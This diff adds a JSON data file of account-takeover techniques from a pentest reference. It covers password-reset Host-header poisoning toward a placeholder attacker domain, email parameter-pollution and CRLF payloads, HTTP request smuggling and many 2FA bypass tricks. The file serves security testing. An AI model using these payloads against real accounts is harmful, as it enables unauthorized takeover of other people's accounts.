@@ -1,0 +1,230 @@
+{
+  "category": "Account Takeover",
+  "source": "PayloadsAllTheThings/Account Takeover/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What ATO is and where to look for it",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Account Takeover (ATO) is the unauthorized seizure of someone else's account through various vectors. Main attack surfaces:\n• Password reset - the primary source: token leakage, host-header poisoning, IDOR, weak/predictable tokens, manipulation of the email parameter.\n• Username/email collisions and normalization (whitespace, Unicode).\n• Web vulnerabilities leading to ATO: XSS (session theft), CSRF (password/email change), HTTP Request Smuggling, JWT manipulation.\n• MFA/2FA bypass (see separate section): response manipulation, code reuse, brute-force, backup codes."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Password reset - attack checklist",
+      "language": "text",
+      "tags": ["methodology", "password-reset"],
+      "body": "1. Token leaks via Referer to third-party resources.\n2. Reset-link poisoning via Host / X-Forwarded-Host (password reset poisoning).\n3. Injecting your own email via parameter pollution, array, cc/bcc, separators.\n4. IDOR in the password-change API (substituting userID/email).\n5. Weak/predictable/reusable reset token.\n6. resetToken leaking directly in the server response body.\n7. Username collision (leading/trailing whitespace) and Unicode email normalization."
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "Reset-token leakage via Referer",
+      "language": "text",
+      "tags": ["password-reset", "referer", "token-leak"],
+      "body": "1. Request a password reset to your own email.\n2. Follow the reset link from the email.\n3. Do NOT change the password.\n4. Click any link to a third-party site (for example, Facebook, Twitter).\n5. Intercept the request in Burp Suite.\n6. Check whether the reset token leaks in the Referer header.\n\nIf the reset page loads external resources (analytics, fonts, widgets), the token from the URL may be sent to an external domain in the Referer."
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "Password Reset Poisoning via the Host header",
+      "language": "text",
+      "tags": ["password-reset", "host-header", "poisoning"],
+      "body": "1. Intercept the password-reset request in Burp Suite.\n2. Add or change the headers: `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`.\n3. Send the request with the spoofed header.\n4. Wait for a reset link built from the host header, in the form: `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`.\n\nIf the backend builds the absolute email URL from the Host header, the victim's token will be sent to your domain."
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "Password Reset Poisoning - example request",
+      "language": "http",
+      "tags": ["password-reset", "host-header"],
+      "body": "POST https://example.com/reset.php HTTP/1.1\nAccept: */*\nContent-Type: application/json\nHost: [ATTACKER.DOMAIN.TLD]"
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "Injecting an email via a parameter (parameter pollution / cc / separators)",
+      "language": "text",
+      "tags": ["password-reset", "email-param", "parameter-pollution"],
+      "body": "# parameter pollution\nemail=victim@mail.com&email=hacker@mail.com\n\n# array of emails\n{\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]}\n\n# carbon copy\nemail=victim@mail.com%0A%0Dcc:hacker@mail.com\nemail=victim@mail.com%0A%0Dbcc:hacker@mail.com\n\n# separator\nemail=victim@mail.com,hacker@mail.com\nemail=victim@mail.com%20hacker@mail.com\nemail=victim@mail.com|hacker@mail.com"
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "IDOR in the password-change API",
+      "language": "text",
+      "tags": ["password-reset", "idor", "api"],
+      "body": "1. Log in with your own account and go to the Change password feature.\n2. Launch Burp Suite and intercept the request.\n3. Send it to Repeater and substitute the parameters: User ID / email with the victim's values.\n\nIf the password change is tied to the supplied identifier rather than the session one, the victim's password gets changed."
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "IDOR in the password-change API - example request",
+      "language": "http",
+      "tags": ["password-reset", "idor"],
+      "body": "POST /api/changepass\n[...]\n(\"form\": {\"email\":\"victim@email.com\",\"password\":\"securepwd\"})"
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "Weak/predictable reset token",
+      "language": "text",
+      "tags": ["password-reset", "weak-token", "predictable"],
+      "body": "The reset token should be random and unique on every request. Check whether it expires and whether it repeats - sometimes the generation algorithm is weak and the token can be guessed. The generation may rely on predictable data:\n• Timestamp\n• UserID\n• User's email\n• First and last name\n• Date of birth\n• Cryptography (weak/home-grown)\n• Digits only\n• Short sequence (<6 characters from [A-Z,a-z,0-9])\n• Token reuse\n• No token expiration"
+    },
+    {
+      "subcategory": "Password reset",
+      "title": "Reset-token leakage in the response body",
+      "language": "text",
+      "tags": ["password-reset", "token-leak", "api"],
+      "body": "1. Trigger a password reset via the API/UI for a specific email, for example: test@mail.com.\n2. Examine the server response and look for a `resetToken` field.\n3. Use the token in a URL of the form: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`."
+    },
+    {
+      "subcategory": "Collisions and normalization",
+      "title": "Password reset via username collision (whitespace)",
+      "language": "text",
+      "tags": ["username-collision", "whitespace", "cve-2020-7245"],
+      "body": "1. Register with a username identical to the victim's, but with whitespace before and/or after, for example: `\"admin \"`.\n2. Request a password reset for your \"malicious\" username.\n3. Use the token from your own email and reset the victim's password.\n4. Log into the victim's account with the new password.\n\nThe CTFd platform was vulnerable to this attack - CVE-2020-7245."
+    },
+    {
+      "subcategory": "Collisions and normalization",
+      "title": "ATO via Unicode normalization",
+      "language": "text",
+      "tags": ["unicode", "normalization", "email"],
+      "body": "When processing Unicode input (case mapping or normalization), unexpected behavior is possible: different characters collapse into one and two accounts are treated as \"the same\".\n\n• Victim's account: `demo@gmail.com`\n• Attacker's account: `demⓞ@gmail.com`\n\nTools: Unisub (finding Unicode characters that collapse into the desired character) and the Unicode pentester cheatsheet (a list of suitable characters for a specific platform)."
+    },
+    {
+      "subcategory": "ATO via web vulnerabilities",
+      "title": "ATO via XSS (session theft)",
+      "language": "text",
+      "tags": ["xss", "session", "cookie"],
+      "body": "1. Find an XSS in the application or on a subdomain, if the cookie is scoped to the parent domain: `*.domain.com`.\n2. Steal the current session cookie.\n3. Authenticate as the user using that cookie.\n\nIf the session cookie lacks the HttpOnly flag or the scope is too broad, an XSS on any subdomain leads to ATO."
+    },
+    {
+      "subcategory": "ATO via web vulnerabilities",
+      "title": "ATO via HTTP Request Smuggling",
+      "language": "text",
+      "tags": ["http-smuggling", "smuggler"],
+      "body": "See also the HTTP Request Smuggling vulnerability page.\n\n1. Determine the smuggling type (CL, TE, CL.TE) using smuggler:\n\ngit clone https://github.com/defparam/smuggler.git\ncd smuggler\npython3 smuggler.py -h\n\n2. Craft a request that will overwrite `POST / HTTP/1.1` with the following data:\n\nGET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1\nX:\n\n3. The final request may look like this (see the separate entry with the example)."
+    },
+    {
+      "subcategory": "ATO via web vulnerabilities",
+      "title": "HTTP Request Smuggling - final request",
+      "language": "http",
+      "tags": ["http-smuggling", "cl.te"],
+      "body": "GET /  HTTP/1.1\nTransfer-Encoding: chunked\nHost: something.com\nUser-Agent: Smuggler/v1.0\nContent-Length: 83\n\n0\n\nGET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1\nX: X"
+    },
+    {
+      "subcategory": "ATO via web vulnerabilities",
+      "title": "ATO via CSRF",
+      "language": "text",
+      "tags": ["csrf", "password-change"],
+      "body": "1. Create a CSRF payload, for example an HTML form with auto-submit targeting the password change.\n2. Deliver the payload to the victim.\n\nIf the password/email change is not protected by a CSRF token and does not require entering the current password, this leads to account takeover."
+    },
+    {
+      "subcategory": "ATO via web vulnerabilities",
+      "title": "ATO via JWT",
+      "language": "text",
+      "tags": ["jwt", "auth-bypass"],
+      "body": "A JWT may be used to authenticate the user.\n\n• Change the User ID / Email in the JWT to another one.\n• Check for a weak JWT signature (alg:none, weak secret, RS256→HS256 confusion)."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Response Manipulation",
+      "language": "text",
+      "tags": ["2fa-bypass", "response-manipulation"],
+      "body": "If the response has `\"success\":false`, change it to `\"success\":true`.\n\nThe client may trust the flag from the response and let you through when the response is tampered with in a proxy."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Status Code Manipulation",
+      "language": "text",
+      "tags": ["2fa-bypass", "status-code"],
+      "body": "If the status code is 4xx, try replacing it with 200 OK and check whether that lifts the restriction."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "2FA code leakage in the response",
+      "language": "text",
+      "tags": ["2fa-bypass", "code-leak"],
+      "body": "Check the response to the request that triggers sending the 2FA code - sometimes the code itself leaks directly in the response body."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Analyzing JS files",
+      "language": "text",
+      "tags": ["2fa-bypass", "js-analysis"],
+      "body": "Rare, but some JS files contain information about the 2FA code - worth checking."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "2FA code reuse",
+      "language": "text",
+      "tags": ["2fa-bypass", "code-reuse"],
+      "body": "The same code can be used repeatedly (no invalidation after the first successful use)."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "No brute-force protection",
+      "language": "text",
+      "tags": ["2fa-bypass", "brute-force"],
+      "body": "You can brute-force a 2FA code of any length - there is no rate-limit and no attempt limit."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Missing Integrity Validation",
+      "language": "text",
+      "tags": ["2fa-bypass", "integrity"],
+      "body": "A code issued for any account passes the 2FA check on a different account (the code is not bound to a specific user)."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "CSRF on disabling 2FA",
+      "language": "text",
+      "tags": ["2fa-bypass", "csrf"],
+      "body": "Disabling 2FA has no CSRF protection and no re-authentication confirmation - the victim's 2FA can be disabled via a forged request."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Password reset disables 2FA",
+      "language": "text",
+      "tags": ["2fa-bypass", "password-reset"],
+      "body": "2FA gets disabled when the password or email is changed - after a reset you can log in without the second factor."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Abusing backup codes",
+      "language": "text",
+      "tags": ["2fa-bypass", "backup-codes"],
+      "body": "Bypassing 2FA via the backup-codes feature. Apply the same techniques to the backup code (response/status manipulation, brute-force, missing binding) to lift/reset the 2FA restrictions."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Clickjacking on the 2FA disable page",
+      "language": "text",
+      "tags": ["2fa-bypass", "clickjacking"],
+      "body": "Place the 2FA disable page in an iframe and use social engineering to make the victim disable 2FA (if there is no X-Frame-Options / CSP frame-ancestors)."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "Enabling 2FA does not terminate active sessions",
+      "language": "text",
+      "tags": ["2fa-bypass", "session"],
+      "body": "If the session is already hijacked and there is a session-timeout vulnerability, enabling 2FA does not invalidate previously active sessions and access is retained."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "2FA bypass via Force Browsing",
+      "language": "text",
+      "tags": ["2fa-bypass", "force-browsing"],
+      "body": "If with 2FA enabled the login redirects to `/2fa/verify`, while without 2FA it goes straight to `/my-account`, try manually navigating to `/my-account` instead of `/2fa/verify` to skip verification."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "2FA bypass with a null or 000000 value",
+      "language": "text",
+      "tags": ["2fa-bypass", "null", "default-value"],
+      "body": "Enter the code 000000 or null to bypass the 2FA protection (the backend may treat an empty/default value as valid)."
+    },
+    {
+      "subcategory": "2FA / MFA bypass",
+      "title": "2FA bypass via an array",
+      "language": "json",
+      "tags": ["2fa-bypass", "array", "type-juggling"],
+      "body": "{\n    \"otp\":[\n        \"1234\",\n        \"1111\",\n        \"1337\", // GOOD OTP\n        \"2222\",\n        \"3333\",\n        \"4444\",\n        \"5555\"\n    ]\n}"
+    }
+  ]
+}
